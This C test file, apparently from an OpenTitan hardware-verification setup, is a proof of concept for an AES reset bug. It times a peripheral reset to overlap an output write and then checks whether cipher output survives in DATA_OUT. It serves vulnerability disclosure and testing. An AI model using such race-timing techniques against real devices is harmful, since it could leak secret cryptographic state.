#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/testing/test_framework/check.h"

#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/base/memory.h"

#include "sw/device/lib/dif/dif_aes.h"
#include "sw/device/lib/dif/dif_rstmgr.h"

#include "aes_regs.h"
#include "dt/dt_rstmgr.h"
#include "dt/dt_aes.h"

OTTF_DEFINE_TEST_CONFIG();

/**
 * POC for AES data_out_q asynchronous-reset gating bug.
 *
 * Strategy (high level):
 * 1. Start a single-block AES encryption so the HW produces an output and
 *    asserts the internal data_out_we signal (sparsely encoded -> SP2V_HIGH).
 * 2. Spin until AES reports OUTPUT_VALID. As soon as we observe OUTPUT_VALID
 *    we immediately request a software reset for the AES peripheral via the
 *    Reset Manager. In simulation this can make the AES module's rst_ni go low
 *    while data_out_we is still asserted.
 * 3. The buggy RTL uses an asynchronous reset that is gated by data_out_we
 *    (see aes_core.sv L872-L878). If rst is asserted while data_out_we ==
 *    SP2V_HIGH, the flop will load data_out_d instead of clearing.
 * 4. After releasing the peripheral reset, we read AES.DATA_OUT. If the
 *    registers contain non-zero / confidential cipher state when they should be
 *    cleared by reset, the vulnerability is demonstrated.
 *
 * Notes:
 * - This test uses DIF only for peripheral reset control and AES convenience
 *   helper functions. All register reads/writes are done via the base MMIO
 *   APIs where appropriate.
 * - The test is deliberately timing-sensitive: a short window is required for
 *   the reset to overlap the data_out_we assertion. In simulation this is
 *   observable.
 */

bool test_main(void) {
  // Initialize Reset Manager DIF.
  dif_rstmgr_t rstmgr;
  CHECK_DIF_OK(dif_rstmgr_init_from_dt(kDtRstmgrAon, &rstmgr));

  // Initialize AES DIF using device-tree index 0 (first AES instance).
  dif_aes_t aes;
  CHECK_DIF_OK(dif_aes_init_from_dt((dt_aes_t)0, &aes));

  // Prepare a simple AES transaction: AES-128 ECB, automatic mode.
  dif_aes_transaction_t trx = {
    .operation = kDifAesOperationEncrypt,
    .mode = kDifAesModeEcb,
    .key_len = kDifAesKey128,
    .manual_operation = kDifAesManualOperationAuto,
    .key_provider = kDifAesKeySoftwareProvided,
    .mask_reseeding = kDifAesReseedPerBlock,
    .reseed_on_key_change = false,
    .force_masks = false,
    .ctrl_aux_lock = false,
  };

  // Use a fixed key and plaintext. We don't need the exact expected cipher
  // value to prove retention; we only check that the output registers are
  // non-zero after reset (they should be cleared).
  dif_aes_key_share_t key = { .share0 = {0x11111111,0x22222222,0x33333333,0x44444444,0x55555555,0x66666666,0x77777777,0x88888888},
                              .share1 = {0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0} };
  dif_aes_iv_t iv = { .iv = {0x0,0x0,0x0,0x0} };
  dif_aes_data_t data_in = { .data = {0xdeadbeef, 0xcafebabe, 0xfeedface, 0xabad1dea} };

  LOG_INFO("Starting AES transaction to generate output...");

  // Configure AES and load key/iv using DIF helper. This mirrors software
  // usage and brings AES into a state where it will produce an output.
  CHECK_DIF_OK(dif_aes_start(&aes, &trx, &key, &iv));

  // Load a single block of data. In automatic mode this will trigger
  // processing and eventually set OUTPUT_VALID.
  CHECK_DIF_OK(dif_aes_load_data(&aes, data_in));

  LOG_INFO("Waiting for AES OUTPUT_VALID...");

  // Wait for OUTPUT_VALID. Once set we will immediately assert a peripheral
  // software reset for AES to attempt to race the buggy asynchronous reset.
  while (true) {
    bool out_valid = false;
    CHECK_DIF_OK(dif_aes_get_status(&aes, kDifAesStatusOutputValid, &out_valid));
    if (out_valid) {
      LOG_INFO("AES OUTPUT_VALID observed, triggering software reset for AES peripheral...");

      // Map the AES device to a reset manager software reset index using the
      // generated device-tree helpers.
      dt_reset_t aes_reset = dt_aes_reset((dt_aes_t)0, kDtAesResetRst);
      size_t aes_sw_reset_index;
      CHECK_DIF_OK(dif_rstmgr_get_sw_reset_index(kDtRstmgrAon, aes_reset, &aes_sw_reset_index));

      // Assert peripheral reset (hold). This should drive the AES rst_ni low
      // for the AES peripheral.
      CHECK_DIF_OK(dif_rstmgr_software_reset(&rstmgr, aes_sw_reset_index, kDifRstmgrSoftwareResetHold));

      // Very small delay to ensure reset sampling overlap in simulation.
      // Use a few busy loops to advance some cycles.
      for (volatile int i = 0; i < 1000; ++i) {
        asm volatile ("nop");
      }

      // Release the reset so the peripheral comes back up and can be read.
      CHECK_DIF_OK(dif_rstmgr_software_reset(&rstmgr, aes_sw_reset_index, kDifRstmgrSoftwareResetRelease));

      break;
    }
  }

  // After the reset we attempt to read AES output registers. The secure reset
  // semantics require these registers to be wiped. The bug causes retention
  // in some races: we therefore assert that any non-zero value is evidence of
  // the vulnerability.
  dif_aes_data_t out_after_reset = { .data = {0} };
  dif_result_t r = dif_aes_read_output(&aes, &out_after_reset);
  if (r == kDifOk) {
    bool all_zero = true;
    for (size_t i = 0; i < 4; ++i) {
      if (out_after_reset.data[i] != 0) {
        all_zero = false;
      }
      LOG_INFO("DATA_OUT[%d] = 0x%08x", i, out_after_reset.data[i]);
    }

    // If any word is non-zero after a reset that was expected to clear state,
    // we report success (vulnerability present). Otherwise the test fails.
    CHECK(!all_zero, "AES data_out registers were cleared by reset - POC did not observe retention");

    LOG_INFO("VULNERABILITY DETECTED: AES DATA_OUT retained non-zero data across reset");
  } else {
    // If reading the output is not possible (e.g., peripheral not ready) we
    // treat this as an inconclusive result but fail the test to highlight
    // that the expected cleared state was not observed in a straightforward
    // way.
    CHECK(false, "Failed to read AES DATA_OUT after reset (dif_aes_read_output returned error)");
  }

  return true;
}
